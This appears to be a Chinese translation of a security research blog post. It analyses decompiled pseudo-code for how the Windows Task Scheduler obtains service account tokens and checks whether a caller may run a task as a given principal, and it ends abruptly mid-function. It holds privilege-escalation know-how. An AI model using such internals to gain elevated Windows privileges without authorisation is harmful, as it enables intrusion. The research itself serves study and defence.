&lt;p&gt;我已经写过关于任务计划程序使用服务账户的博客。特别是在之前的文章中，我讨论了如何通过使用服务SID运行计划任务来获取TrustedInstaller组权限。由于服务SID与虚拟服务账户使用的名称相同，问题显然出在该功能的实现方式上，并且很可能与LS或NS令牌的创建方式不同。&lt;/p&gt;
&lt;p&gt;Windows 10中任务计划程序的核心进程创建代码实际上位于统一后台进程管理器（UBPM）DLL中，而不是任务计划程序本身。快速查看该DLL会发现以下代码：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;HANDLE&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;UbpmpTokenGetNonInteractiveToken&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PSID&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;PrincipalSid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;// ...
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;UbpmUtilsIsServiceSid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PrinicpalSid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;UbpmpTokenGetServiceAccountToken&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PrinicpalSid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;EqualSid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PrinicpalSid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;kNetworkService&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;Domain&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;NT AUTHORITY&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;User&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;NetworkService&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;EqualSid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PrinicpalSid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;kLocalService&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;Domain&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;NT AUTHORITY&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;User&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;LocalService&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;HANDLE&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Token&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;LogonUserExExW&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;User&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Domain&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     &lt;span class=&#34;n&#34;&gt;LOGON32_LOGON_SERVICE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     &lt;span class=&#34;n&#34;&gt;LOGON32_PROVIDER_DEFAULT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Token&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Token&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;// ...
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;这个&lt;code&gt;UbpmpTokenGetNonInteractiveToken&lt;/code&gt;函数从任务注册或传递给RunEx的主体SID中确定其代表的内容以获取令牌。它检查SID是否是服务SID（即我们在之前博客文章中使用的NT SERVICE\NAME SID）。如果是，则调用单独的函数&lt;code&gt;UbpmpTokenGetServiceAccountToken&lt;/code&gt;来获取服务令牌。&lt;/p&gt;
&lt;p&gt;否则，如果SID是NS或LS，则指定这些SID的已知名称并使用&lt;code&gt;LOGON32_LOGON_SERVICE&lt;/code&gt;类型调用&lt;code&gt;LogonUserExEx&lt;/code&gt;。&lt;code&gt;UbpmpTokenGetServiceAccountToken&lt;/code&gt;函数执行以下操作：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;TOKEN&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;UbpmpTokenGetServiceAccountToken&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PSID&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;PrincipalSid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;LPCWSTR&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;UbpmUtilsGetAccountNamesFromSid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PrincipalSid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;SC_HANDLE&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;scm&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;OpenSCManager&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SC_MANAGER_CONNECT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;SC_HANDLE&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;service&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;OpenService&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;scm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SERVICE_ALL_ACCESS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;HANDLE&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Token&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;GetServiceProcessToken&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;g_ScheduleServiceHandle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;service&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Token&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Token&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;此函数从服务SID中获取名称（即服务本身的名称），并为其打开所有访问权限（SERVICE_ALL_ACCESS）。如果成功，则将服务句柄传递给未记录的SCM API &lt;code&gt;GetServiceProcessToken&lt;/code&gt;，该API返回服务的令牌。查看SCM中的实现，基本上使用与启动服务时创建令牌完全相同的代码。&lt;/p&gt;
&lt;p&gt;这就是为什么在使用Clément的技术时，LS/NS与虚拟服务账户之间存在区别。如果使用LS/NS，任务计划程序会从LSA获取一个新令牌，而不考虑服务的配置方式。因此，新令牌具有SeImpersonatePrivilege（或其他允许的权限）。然而，对于虚拟服务账户，服务会向SCM请求服务令牌，由于SCM知道已设置的限制，它会遵循诸如权限或SID类型等内容。因此，返回的令牌将再次被剥离SeImpersonatePrivilege，尽管从技术上讲它与当前运行的服务是不同的令牌。&lt;/p&gt;
&lt;p&gt;为什么任务计划程序需要一些未记录的函数来获取服务令牌？正如我在之前关于虚拟账户的博客文章中提到的那样，只有SCM（严格来说是第一个声明自己是SCM的进程）被允许使用虚拟服务账户验证令牌。在我看来这有点毫无意义，因为你已经需要SeTcbPrivilege来创建服务令牌，但事实就是如此。&lt;/p&gt;
&lt;p&gt;好的，现在我们知道了为什么Clément的技术无法恢复任何权限。你现在可能会问，那又怎样？在研究任务计划程序如何确定是否允许将服务SID指定为主体时，我发现了一个有趣的行为。在我关于创建以TrustedInstaller身份运行的任务的博客文章中，我暗示需要管理员访问权限，这在一定程度上是正确的，但也不完全正确。让我们看看任务计划程序用来确定调用者是否被允许以指定主体身份运行任务的函数。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;BOOL&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;IsPrincipalAllowed&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;User&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;principal&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;RpcAutoImpersonate&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;RpcAutoImpersonate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;User&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;caller&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;n&#34;&gt;User&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;FromImpersonationToken&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;caller&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nf&#34;&gt;RpcRevertToSelf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tsched&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;IsUserAdmin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;caller&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       &lt;span class=&#34;n&#34;&gt;caller&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;IsLocalSystem&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;caller&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;TRUE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;principal&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;caller&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;TRUE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;principal&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;IsServiceSid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;LPCWSTR&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;principal&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;GetAccount&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;RpcAutoImpersonate&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;RpcAutoImpersonate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;SC_HANDLE&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;scm&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;OpenSCManager&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SC_MANAGER_CONNECT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;SC_HANDLE&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;service&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;OpenService&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;scm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SERVICE_ALL_ACCESS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
